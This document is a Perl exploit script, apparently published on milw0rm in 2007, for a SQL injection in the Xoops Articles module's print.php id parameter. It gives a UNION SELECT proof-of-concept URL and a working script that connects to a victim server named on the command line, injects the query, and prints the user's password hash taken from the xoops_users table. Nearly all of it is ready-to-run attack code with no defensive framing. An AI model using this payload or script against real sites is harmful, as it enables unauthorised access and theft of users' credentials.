#!/usr/bin/perl -w

# Xoops All Version -Articles- Print.PHP (ID) Blind SQL Injection Exploit And PoC

# Type :

# SQL Injection

# Release Date :

# {2007-03-26}

# Product / Vendor :

# http://support.sirium.net/

# Bug :

# http://localhost/script/modules/articles/print.php?id=x AND 1=1 or 1=0

# PoC :

# http://localhost/script/modules/articles/print.php?id=3/**/UNION/**/SELECT/**/NULL,NULL,NULL,NULL,uid,uname,pass,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL/**/FROM/**/xoops_users/**/LIMIT/**/1,1/*

# Exploit :

#############################################
#Exploit Coded By UNIQUE-KEY[UNIQUE-CRACKER]#
#############################################

use IO::Socket;

if (@ARGV != 3)
{
    print "\n-----------------------------------\n";
    print "Xoops All Version -Articles- Print.PHP (ID) Blind SQL Injection Exploit\n";
    print "-----------------------------------\n";
    print "\nUniquE-Key{UniquE-Cracker}\n";
    print "UniquE[at]UniquE-Key.ORG\n";
    print "http://UniquE-Key.ORG\n";
    print "\n-----------------------------------\n";
    print "\nUsage: $0 <server> <path> <uid>\n";
    print "Examp: $0 www.victim.com /path 1\n";
    print "\n-----------------------------------\n";
    exit ();
}

$server = $ARGV[0];
$path = $ARGV[1];
$uid = $ARGV[2];

$socket = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$server",  PeerPort => "80");
printf $socket ("GET %s/modules/articles/print.php?id=3/**/UNION/**/SELECT/**/NULL,NULL,NULL,NULL,NULL,pass,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL/**/FROM/**/xoops_users/**/WHERE/**/uid=$uid/* HTTP/1.0\nHost: %s\nAccept: */*\nConnection: close\n\n",
$path,$server,$uid);

while(<$socket>)

{
    if (/\>(\w{32})\</) { print "\nID '$uid' User Password :\n\n$1\n"; }
}

# Tested :

# All Version

# Author :

# UniquE-Key{UniquE-Cracker}
# UniquE(at)UniquE-Key.Org
# http://www.UniquE-Key.Org

# milw0rm.com [2007-03-27]
